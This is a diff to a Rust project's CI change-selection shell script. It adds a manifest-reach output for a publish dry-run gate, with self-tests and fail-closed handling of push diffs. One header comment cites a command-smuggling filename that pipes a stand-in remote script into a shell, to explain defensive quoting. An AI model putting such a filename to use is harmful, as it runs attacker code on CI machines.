@@ -14,11 +14,12 @@
 #   scripts/ci-changes.sh --self-test  # verify the container map against cargo
 #
 # Environment:
-#   EVENT_NAME  github.event_name
-#   BASE_SHA    github.event.pull_request.base.sha  (pull_request only)
-#   HEAD_SHA    github.event.pull_request.head.sha  (pull_request only)
-#   PR_AUTHOR   github.event.pull_request.user.login  (NOT github.actor, which
-#               changes on a re-run)
+#   EVENT_NAME    github.event_name
+#   BASE_SHA      github.event.pull_request.base.sha  (pull_request only)
+#   HEAD_SHA      github.event.pull_request.head.sha  (pull_request only)
+#   EVENT_BEFORE  github.event.before  (push only; the `manifests` output)
+#   PR_AUTHOR     github.event.pull_request.user.login  (NOT github.actor,
+#                 which changes on a re-run)
 #
 # Filenames are attacker-controlled: a branch may legally contain a file called
 # `$(curl evil.sh|sh).rs`. Every path is read into a variable and matched with
@@ -612,6 +613,59 @@ if len(set(keys)) != len(keys):
     check_flags true false "a bench source builds Rust and does not rebuild the site" \
         bench/src/lib.rs
 
+    # The manifest gate's selection, asserted the same way. Source changes do
+    # not select it: the nightly backstop covers packaging breaks a manifest
+    # list cannot see, and selecting on source would run it on every merge.
+    check_manifests() { # want, desc, paths...
+        local want="$1" desc="$2"
+        shift 2
+        local out got
+        out=$(mktemp)
+        classify_into "$out" "$@"
+        got=$(sed -n 's/^manifests=//p' "$out")
+        rm -f "$out"
+        if [[ "$got" != "$want" ]]; then
+            echo "::error::$desc: expected manifests=$want, got manifests=$got for: $*"
+            path_case_failed=1
+        fi
+    }
+    check_manifests true "the lockfile reaches packaging" Cargo.lock
+    check_manifests true "the workspace manifest reaches packaging" Cargo.toml
+    check_manifests true "a crate manifest reaches packaging" crates/spate-core/Cargo.toml
+    check_manifests true "the bump tool is the gate's own apparatus" scripts/release-version.sh
+    check_manifests true "the selector is the gate's own apparatus" scripts/ci-changes.sh
+    check_manifests false "a crate source does not select the gate" crates/spate-core/src/lib.rs
+    check_manifests false "a README does not select the gate" crates/spate/README.md
+    check_manifests false "a docs page does not select the gate" docs/METRICS.md
+
+    # The push branch computes its own diff and never sees a path list, so
+    # the cases above cannot cover it; these hold its fail-closed edges and
+    # its one cheap invariant through the environment the `changes` job sets.
+    check_manifests_env() { # want, desc, before
+        local want="$1" desc="$2" before="$3"
+        local out got
+        out=$(mktemp)
+        env -u PR_LABELS EVENT_NAME=push EVENT_BEFORE="$before" GITHUB_OUTPUT="$out" \
+            "$0" >/dev/null
+        got=$(sed -n 's/^manifests=//p' "$out")
+        rm -f "$out"
+        if [[ "$got" != "$want" ]]; then
+            echo "::error::$desc: expected manifests=$want, got manifests=$got (EVENT_BEFORE='$before')"
+            path_case_failed=1
+        fi
+    }
+    check_manifests_env false "an empty push diff selects nothing" "$(git rev-parse HEAD)"
+    check_manifests_env true "the zero SHA fails closed" "0000000000000000000000000000000000000000"
+    check_manifests_env true "an unreachable before fails closed" "4242424242424242424242424242424242424242"
+    check_manifests_env true "a missing before fails closed" ""
+    out=$(mktemp)
+    env -u PR_LABELS EVENT_NAME=schedule GITHUB_OUTPUT="$out" "$0" >/dev/null
+    if [[ "$(sed -n 's/^manifests=//p' "$out")" != "true" ]]; then
+        echo "::error::a force_all event must emit manifests=true"
+        path_case_failed=1
+    fi
+    rm -f "$out"
+
     [[ "$path_case_failed" == "0" ]] || exit 1
 
     echo "container_suites_for() matches the crate graph, CONTAINER_PKGS matches the tree,"
@@ -849,6 +903,58 @@ if [[ -n "${suites// /}" ]]; then
 fi
 
 # ---------------------------------------------------------------------------
+# Manifest reach, for the publish dry-run gate.
+# ---------------------------------------------------------------------------
+# The set of files that can change whether `cargo package` succeeds: the
+# manifests and lockfile, plus the gate's own apparatus — the bump tool, this
+# selector, and the workflow that wires them — so an edit that narrows the
+# gate is itself gated, the same rule the bench arm applies. The READMEs are
+# packaged but cannot fail packaging; their versions are held by
+# check-release-version, which runs on every event.
+path_is_manifest() {
+    case "$1" in
+    Cargo.toml | Cargo.lock | crates/*/Cargo.toml | bench/Cargo.toml) return 0 ;;
+    scripts/release-version.sh | scripts/ci-changes.sh) return 0 ;;
+    .github/workflows/ci.yml) return 0 ;;
+    esac
+    return 1
+}
+
+# Its own diff on push: push mode force-runs every job above as the last line
+# of defence, while the dry run is selected on manifest reach alone, so
+# `force_all` would pin it on for every merge. A diff that cannot be resolved
+# (a force push, the zero SHA of a branch creation) fails closed to true, and
+# the nightly backstop in scheduled.yml covers what a path list misses.
+manifests=false
+if [[ "$mode" == "push" ]]; then
+    manifest_diff=$(mktemp)
+    zero_sha=0000000000000000000000000000000000000000
+    if [[ -n "${EVENT_BEFORE:-}" && "${EVENT_BEFORE:-}" != "$zero_sha" ]] &&
+        git diff --no-ext-diff --no-textconv --name-only -z --no-renames \
+            "$EVENT_BEFORE" HEAD >"$manifest_diff" 2>/dev/null; then
+        while IFS= read -r -d '' file; do
+            [[ -z "$file" ]] && continue
+            if path_is_manifest "$file"; then
+                manifests=true
+            fi
+        done <"$manifest_diff"
+    else
+        echo "note: no usable ${EVENT_BEFORE:-?}..HEAD diff; the manifest gate fails closed."
+        manifests=true
+    fi
+    rm -f "$manifest_diff"
+elif [[ "$force_all" == "1" ]]; then
+    manifests=true
+else
+    while IFS= read -r -d '' file; do
+        [[ -z "$file" ]] && continue
+        if path_is_manifest "$file"; then
+            manifests=true
+        fi
+    done <"$changed_file"
+fi
+
+# ---------------------------------------------------------------------------
 # Emit.
 # ---------------------------------------------------------------------------
 {
@@ -858,6 +964,7 @@ fi
     echo "container-args=$container_args"
     echo "loom=$loom"
     echo "bench=$bench"
+    echo "manifests=$manifests"
     # One line of JSON, and one line only: `$GITHUB_OUTPUT` is a key=value
     # file, so a multi-line value would need heredoc delimiters and a value
     # containing the delimiter is a known output-injection vector.
